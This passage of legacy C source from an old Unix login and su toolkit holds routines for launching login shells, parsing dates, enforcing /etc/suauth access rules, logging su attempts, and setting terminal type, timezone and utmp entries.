	if ((envf = getdef_str("ENVIRON_FILE")) && (fp = fopen(envf, "r"))) {
		while (fgets(buf, sizeof buf, fp) == buf) {
			cp = strchr(buf, '\n');
			if (!cp)
				break;
			*cp = '\0';
			if (buf[0] == '#' || buf[0] == '\0')
				continue;
			addenv(buf, NULL);
		}
		fclose(fp);
	}
}
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: shell.c,v 1.2 1996/09/20 09:08:03 marekm Exp $")

#include <stdio.h>
#include <errno.h>
#include "prototypes.h"
#include "defines.h"


extern char **newenvp;
extern size_t newenvc;

/*
 * shell - execute the named program
 *
 *	shell begins by trying to figure out what argv[0] is going to
 *	be for the named process.  The user may pass in that argument,
 *	or it will be the last pathname component of the file with a
 *	'-' prepended.  The first attempt is to just execute the named
 *	file.  If the errno comes back "ENOEXEC", the file is assumed
 *	at first glance to be a shell script.  The first two characters
 *	must be "#!", in which case "/bin/sh" is executed to process
 *	the file.  If all that fails, give up in disgust ...
 */

void
shell(file, arg)
	char *file;
	char *arg;
{
	char	arg0[BUFSIZ];
	int	err;

	if (file == (char *) 0)
		exit (1);

	/*
	 * The argv[0]'th entry is usually the path name, but
	 * for various reasons the invoker may want to override
	 * that.  So, we determine the 0'th entry only if they
	 * don't want to tell us what it is themselves.
	 */

	if (arg == (char *) 0) {
		arg0[0] = '-';
		strncpy(arg0+1, Basename(file), sizeof(arg0)-2);
		arg0[sizeof(arg0)-1] = '\0';
		arg = arg0;
	}
#ifndef	NDEBUG
	printf ("Executing shell %s\n", file);
#endif

	/*
	 * First we try the direct approach.  The system should be
	 * able to figure out what we are up to without too much
	 * grief.
	 */

	execle (file, arg, (char *) 0, newenvp);
	err = errno;

	/* Linux handles #! in the kernel, and bash doesn't make
	   sense of "#!" so it wouldn't work anyway...  --marekm */
#ifndef __linux__
	/*
	 * It is perfectly OK to have a shell script for a login
	 * shell, and this code attempts to support that.  It
	 * relies on the standard shell being able to make sense
	 * of the "#!" magic number.
	 */

	if (err == ENOEXEC) {
		FILE	*fp;

		if ((fp = fopen (file, "r"))) {
			if (getc (fp) == '#' && getc (fp) == '!') {
				fclose (fp);
				execle ("/bin/sh", "sh",
					file, (char *) 0, newenvp);
				err = errno;
			} else {
				fclose (fp);
			}
		}
	}
#endif

	/*
	 * Obviously something is really wrong - I can't figure out
	 * how to execute this stupid shell, so I might as well give
	 * up in disgust ...
	 */

	sprintf (arg0, "Cannot execute %s", file);
	errno = err;
	perror (arg0);
	exit (err);
}
/*
 * Copyright 1991 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: strtoday.c,v 1.2 1996/09/25 03:19:57 marekm Exp $")

#include "defines.h"
#include <stdio.h>

#ifdef HAVE_STRPTIME
/*
 * for now we allow just one format, but we can define more later
 * (we try them all until one succeeds).  --marekm
 */
static char *date_formats[] = {
	DATE_FORMAT_STRING,
	(char *) 0
};
#else
/*
 * days and juldays are used to compute the number of days in the
 * current month, and the cummulative number of days in the preceding
 * months.  they are declared so that january is 1, not 0.
 */

static	short	days[13] = { 0,
	31,	28,	31,	30,	31,	30,	/* JAN - JUN */
	31,	31,	30,	31,	30,	31 };	/* JUL - DEC */

static	short	juldays[13] = { 0,
	0,	31,	59,	90,	120,	151,	/* JAN - JUN */
	181,	212,	243,	273,	304,	334 };	/* JUL - DEC */
#endif

/*
 * strtoday - compute the number of days since 1970.
 *
 * the total number of days prior to the current date is
 * computed.  january 1, 1970 is used as the origin with
 * it having a day number of 0.
 */

long
strtoday(str)
	const char *str;
{
#ifdef HAVE_STRPTIME
	struct tm tp;
	char **fmt;
	char *cp;
	time_t result;

	for (fmt = &date_formats; *fmt; fmt++) {
		cp = strptime(str, *fmt, &tp);
		if (!cp || *cp != '\0')
			continue;

		result = mktime(&tp);
		if (result == (time_t) -1)
			continue;

		return result / DAY;  /* success */
	}
	return -1;
#else
	char	slop[2];
	int	month;
	int	day;
	int	year;
	long	total;

	/*
	 * start by separating the month, day and year.  the order
	 * is compiled in ...
	 */

#ifdef	MDY_DATE
	if (sscanf (str, "%d/%d/%d%c", &month, &day, &year, slop) != 3)
		return -1;
#endif
#ifdef	DMY_DATE
	if (sscanf (str, "%d/%d/%d%c", &day, &month, &year, slop) != 3)
		return -1;
#endif
#ifdef	YMD_DATE
	if (sscanf (str, "%d/%d/%d%c", &year, &month, &day, slop) != 3)
		return -1;
#endif

	/*
	 * the month, day of the month, and year are checked for
	 * correctness and the year adjusted so it falls between
	 * 1970 and 2069.
	 */

	if (month < 1 || month > 12)
		return -1;

	if (day < 1)
		return -1;

	if ((month != 2 || (year % 4) != 0) && day > days[month])
		return -1;
	else if ((month == 2 && (year % 4) == 0) && day > 29)
		return -1;

	if (year < 0)
		return -1;
	else if (year <= 69)
		year += 2000;
	else if (year <= 99)
		year += 1900;

	if (year < 1970 || year > 2069)
		return -1;

	/*
	 * the total number of days is the total number of days in all
	 * the whole years, plus the number of leap days, plus the
	 * number of days in the whole months preceding, plus the number
	 * of days so far in the month.
	 */

	total = (long) ((year - 1970) * 365L) + (((year + 1) - 1970) / 4);
	total += (long) juldays[month] + (month > 2 && (year % 4) == 0 ? 1:0);
	total += (long) day - 1;

	return total;
#endif /* HAVE_STRPTIME */
}
#include <config.h>

#ifdef SU_ACCESS

#include <stdio.h>
#include <pwd.h>
#include <grp.h>
#include <sys/types.h>
#include <errno.h>
#include "prototypes.h"
#include "defines.h"

#ifndef SUAUTHFILE
#define SUAUTHFILE "/etc/suauth"
#endif

#define	NOACTION	0
#define	NOPWORD		1
#define	DENY		-1
#define	OWNPWORD	2

/* Really, I could do with a few const char's here defining all the 
 * strings output to the user or the syslog. -- chris
 */

static int applies P_((const char *, char *));

int check_su_auth P_((const char *, const char *));
int isgrp P_((const char *, const char *));

static int lines = 0;

extern struct passwd pwent;

int
check_su_auth(actual_id, wanted_id)
	const char *actual_id;
	const char *wanted_id;
{
	int	posn, endline;

	const	char    field[] = ":";
	FILE    *authfile_fd;

	const   char    *p_deny = "DENY";
	const   char    *p_nopass = "NOPASS";
	const	char	*p_ownpass = "OWNPASS";

	char	temp[BUFSIZ];
	char	*to_users;
	char	*from_users;
	char	*action;

	if (!(authfile_fd = fopen(SUAUTHFILE, "r"))) {
		/*
		 * If the file doesn't exist - default to the standard su
		 * behaviour (no access control).  If open fails for some
		 * other reason - maybe someone is trying to fool us with
		 * file descriptors limit etc., so deny access.  --marekm
		 */
		if (errno == ENOENT)
			return NOACTION;
		SYSLOG((LOG_ERR, "could not open/read config file '%s': %m\n",
			SUAUTHFILE));
		return DENY;
	}

	while (fgets(temp, sizeof(temp), authfile_fd) != NULL) {
		lines++;

		if (temp[endline = strlen(temp) - 1] != '\n') {
			SYSLOG((LOG_ERR,
				"%s, line %d: line too long or missing newline",
				SUAUTHFILE, lines));
			continue;
		}

		while (endline > 0 && (temp[endline-1] == ' ' 
			|| temp[endline-1] == '\t' || temp[endline-1] == '\n'))
			endline--;
		temp[endline] = '\0';

		posn = 0;
		while (temp[posn] == ' ' || temp[posn] == '\t')
			posn++;

		if (temp[posn] == '\n' || temp[posn] == '#' || temp[posn] == '\0') {
			continue;
		}
		if (!(to_users = strtok(temp + posn, field))
			|| !(from_users = strtok((char *)NULL, field))
			|| !(action = strtok((char *)NULL, field))
			|| strtok((char *)NULL, field)) {
			SYSLOG((LOG_ERR, "%s, line %d. Bad number of fields.\n",
				SUAUTHFILE, lines));
			continue;
		}

		if (applies(wanted_id, to_users)) {
			if (applies(actual_id, from_users)) {
				if (!strcmp(action, p_deny)) {
					SYSLOG((pwent.pw_uid ? LOG_NOTICE : LOG_WARN,
						"DENIED su from `%s' to `%s' (%s)\n",
						actual_id, wanted_id, SUAUTHFILE));
					fprintf(stderr, "Access to su to that account DENIED.\n");
					fclose(authfile_fd);
					return DENY;
				} else if (!strcmp(action, p_nopass)) {
					SYSLOG((pwent.pw_uid ? LOG_INFO : LOG_NOTICE,
						"NO password asked for su from `%s' to `%s' (%s)\n",
						actual_id, wanted_id, SUAUTHFILE));
					fprintf(stderr, "Password authentication bypassed.\n");
					fclose(authfile_fd);
					return NOPWORD;
				} else if (!strcmp(action, p_ownpass)) {
					SYSLOG((pwent.pw_uid ? LOG_INFO : LOG_NOTICE,
						"su from `%s' to `%s': asking for user's own password (%s)\n",
						actual_id, wanted_id, SUAUTHFILE));
					fprintf(stderr, "Please enter your OWN password as authentication.\n");
					fclose(authfile_fd);
					return OWNPWORD;
				} else {
					SYSLOG((LOG_ERR, "%s, line %d: unrecognised action!\n",
						SUAUTHFILE, lines));
				}
			}
		}
	} 
	return 0;
}

static int
applies(single, list)
	const char *single;
	char *list;
{
	const	char	*p_all = "ALL";
	const	char	*p_except = "EXCEPT";
	const	char	*p_group = "GROUP";

	const	char	split[] = ", ";
	char	*tok;

	int state = 0;

	for (tok = strtok(list, split); tok != NULL; tok = strtok(NULL, split)) {

		if (!strcmp(tok, p_all)) {
			if (state) {
				SYSLOG((LOG_ERR,
					"%s, line %d: ALL in bad place\n",
					SUAUTHFILE, lines));
				return 0;
			}
			state = 1;
		} else if (!strcmp(tok, p_except)) {
			if (state != 1) {
				SYSLOG((LOG_ERR,
					"%s, line %d: EXCEPT in bas place\n",
					SUAUTHFILE, lines));
				return 0;
			}
			state = 2;
		} else if (!strcmp(tok, p_group)) {
			if (state && (state != 2)) {
				SYSLOG((LOG_ERR,
					"%s, line %d: GROUP in bad place\n",
					SUAUTHFILE, lines));
				return 0;
			}
			if (!state) {
				state = 3;
			} else {
				state = 4;
			}
		} else {
			switch (state) {
				case 0: /* No control words yet */
					if (!strcmp(tok, single))
						return 1;
					break;
				case 1: /* An all */
        		                SYSLOG((LOG_ERR, "%s, line %d: expect another token after ALL\n",
						SUAUTHFILE, lines));
					return 0;
				case 2: /* All except */
					if (!strcmp(tok, single))
						return 0;
					break;
				case 3: /* Group */
					if (isgrp(single, tok))
						return 1;
					break;
				case 4: /* All except group */
					if (isgrp(single, tok))
						return 0;
					/* FALL THRU */
			}
		}
	}
	if (state && (state != 3))
		return 1;
	return 0;
}

int
isgrp(name, group)
	const char *name;
	const char *group;
{
	struct	group	*grp;

	grp = getgrnam(group);

	if (!grp || !grp->gr_mem)
		return 0;

	return is_on_list(grp->gr_mem, name);
}
#endif /* SU_ACCESS */
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: sub.c,v 1.2 1996/09/20 09:08:03 marekm Exp $")

#include <sys/types.h>
#include "defines.h"

#include <pwd.h>

#define	BAD_SUBROOT	"Invalid root directory \"%s\"\n"
#define	BAD_SUBROOT2	"invalid root `%s' for user `%s'\n"
#define	NO_SUBROOT	"Can't change root directory to \"%s\"\n"
#define	NO_SUBROOT2	"no subsystem root `%s' for user `%s'\n"

/*
 * subsystem - change to subsystem root
 *
 *	A subsystem login is indicated by the presense of a "*" as
 *	the first character of the login shell.  The given home
 *	directory will be used as the root of a new filesystem which
 *	the user is actually logged into.
 */

void
subsystem(pw)
	const struct passwd *pw;
{
	/*
	 * The new root directory must begin with a "/" character.
	 */

	if (pw->pw_dir[0] != '/') {
		printf (BAD_SUBROOT, pw->pw_dir);
		SYSLOG((LOG_WARN, BAD_SUBROOT2, pw->pw_dir, pw->pw_name));
		closelog();
		exit (1);
	}

	/*
	 * The directory must be accessible and the current process
	 * must be able to change into it.
	 */

	if (chdir (pw->pw_dir) || chroot (pw->pw_dir)) {
		printf (NO_SUBROOT, pw->pw_dir);
		SYSLOG((LOG_WARN, NO_SUBROOT2, pw->pw_dir, pw->pw_name));
		closelog();
		exit (1);
	}
}
/*
 * Copyright 1989 - 1992, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: sulog.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <time.h>
#include "defines.h"
#include "getdef.h"

extern	char	name[];
extern	char	oldname[];

/*
 * sulog - log a SU command execution result
 */

void
sulog (tty, success)
	const char *tty;	/* Name of terminal SU was executed from */
	int success;		/* Success (1) or failure (0) of command */
{
	char	*sulog;
	time_t	clock;
	struct	tm	*tm;
	struct	tm	*localtime ();
	FILE	*fp;

	if ( (sulog=getdef_str("SULOG_FILE")) == (char *) 0 )
		return;

	if ((fp = fopen (sulog, "a+")) == (FILE *) 0)
		return;			/* can't open or create logfile */

	(void) time (&clock);
	tm = localtime (&clock);

	(void) fprintf (fp, "SU %.02d/%.02d %.02d:%.02d %c %.6s %s-%s\n",
		tm->tm_mon + 1, tm->tm_mday, tm->tm_hour, tm->tm_min,
		success ? '+':'-', tty, oldname, name);

	fflush (fp);
	fclose (fp);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: ttytype.c,v 1.2 1996/09/20 09:08:03 marekm Exp $")

#include <stdio.h>
#include "prototypes.h"
#include "defines.h"

extern	char	*getdef_str();

/*
 * ttytype - set ttytype from port to terminal type mapping database
 */

void
ttytype(line)
	const char *line;
{
	FILE	*fp;
	char	buf[BUFSIZ];
	char	*typefile;
	char	*cp;
	char	type[BUFSIZ];
	char	port[BUFSIZ];
	char	*getenv ();

	if (getenv ("TERM"))
		return;
	if ((typefile=getdef_str("TTYTYPE_FILE")) == NULL )
		return;
	if (access (typefile, 0))
		return;

	if (! (fp = fopen (typefile, "r"))) {
		perror (typefile);
		return;
	}
	while (fgets (buf, BUFSIZ, fp)) {
		if (buf[0] == '#')
			continue;

		if ((cp = strchr (buf, '\n')))
			*cp = '\0';

#if defined(SUN) || defined(BSD) || defined(SUN4)
		if ((sscanf (buf, "%s \"%*[^\"]\" %s", port, type) == 2 ||
				sscanf (buf, "%s %*s %s", port, type) == 2) &&
				strcmp (line, port) == 0)
			break;
#else	/* USG */
		if (sscanf (buf, "%s %s", type, port) == 2 &&
				strcmp (line, port) == 0)
			break;
#endif
	}
	if (! feof (fp) && ! ferror (fp))
		addenv("TERM", type);

	fclose (fp);
}
/*
 * Copyright 1991 - 1994, John F. Haugh II and Chip Rosenthal
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: tz.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include "getdef.h"

/*
 * tz - return local timezone name
 *
 * tz() determines the name of the local timezone by reading the
 * contents of the file named by ``fname''.
 */

char *
tz(fname)
	const char *fname;
{
	FILE *fp = 0;
	static char tzbuf[BUFSIZ];
	char	*def_tz;

	if ((fp = fopen(fname,"r")) == NULL ||
			fgets (tzbuf, sizeof (tzbuf), fp) == NULL) {
		if (! (def_tz = getdef_str ("ENV_TZ")) || def_tz[0] == '/')
			def_tz = "TZ=CST6CDT";

		strcpy (tzbuf, def_tz);
	} else
		tzbuf[strlen(tzbuf) - 1] = '\0';

	if (fp)
		(void) fclose(fp);

	return tzbuf;
}
#include <config.h>

#include "rcsid.h"
RCSID("$Id: ulimit.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#if HAVE_ULIMIT_H
#include <ulimit.h>

#ifndef UL_SETFSIZE
#ifdef UL_SFILLIM
#define UL_SETFSIZE UL_SFILLIM
#else
#define UL_SETFSIZE 2
#endif
#endif

#elif HAVE_SYS_RESOURCE_H
#include <sys/time.h>  /* for struct timeval on sunos4 */
/* XXX - is the above ok or should it be <time.h> on ultrix? */
#include <sys/resource.h>
#endif

void
set_filesize_limit(blocks)
	int blocks;
{
#if HAVE_ULIMIT_H
	ulimit(UL_SETFSIZE, blocks);
#elif defined(RLIMIT_FSIZE)
	struct rlimit rlimit_fsize;

	rlimit_fsize.rlim_cur = rlimit_fsize.rlim_max = 512L * blocks;
	setrlimit(RLIMIT_FSIZE, &rlimit_fsize);
#endif
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "defines.h"

#include <utmp.h>

#if HAVE_UTMPX_H
#include <utmpx.h>
#endif

#include <fcntl.h>
#include <stdio.h>

#include "rcsid.h"
RCSID("$Id: utmp.c,v 1.2 1996/09/10 02:45:13 marekm Exp $")

#if HAVE_UTMPX_H
extern	struct	utmpx	utxent;
extern	char	host[257];
#endif
extern	struct	utmp	utent;

extern	struct	utmp	*getutent();
extern	struct	utmp	*getutline();
extern	void	setutent();
extern	void	endutent();
extern	time_t	time();
extern	char	*ttyname();
extern	long	lseek();

#define	NO_UTENT \
	"No utmp entry.  You must exec \"login\" from the lowest level \"sh\""
#define	NO_TTY \
	"Unable to determine your tty name."

/*
 * checkutmp - see if utmp file is correct for this process
 *
 *	System V is very picky about the contents of the utmp file
 *	and requires that a slot for the current process exist.
 *	The utmp file is scanned for an entry with the same process
 *	ID.  If no entry exists the process exits with a message.
 *
 *	The "picky" flag is for network and other logins that may
 *	use special flags.  It allows the pid checks to be overridden.
 *	This means that getty should never invoke login with any
 *	command line flags.
 */

void
checkutmp (picky)
	int picky;
{
	char	*line;
#ifdef LOGIN_PROCESS
#if HAVE_UTMPX_H
	struct	utmpx	*utx, *getutxline();
#endif
	struct	utmp	*ut, *getutline();
#ifndef	NDEBUG
	int	pid = getppid ();
#else
	int	pid = getpid ();
#endif	/* !NDEBUG */
#endif	/* USG */

#if HAVE_UTMPX_H
	setutxent ();
#endif
#if HAVE_SETUTENT
	setutent ();
#endif	/* !SUN */

#if defined(__linux__)
	/* First, try to find a valid utmp entry for this process.  */
	while ((ut = getutent()))
		if (ut->ut_pid == pid && ut->ut_line[0] && ut->ut_id[0] &&
		    (ut->ut_type==LOGIN_PROCESS || ut->ut_type==USER_PROCESS))
			break;

	/* If there is one, just use it, otherwise create a new one.  */
	if (ut) {
		utent = *ut;
	} else {
		if (picky) {
			puts(NO_UTENT);
			exit(1);
		}
		line = ttyname(0);
		if (!line) {
			puts(NO_TTY);
			exit(1);
		}
		if (strncmp(line, "/dev/", 5) == 0)
			line += 5;
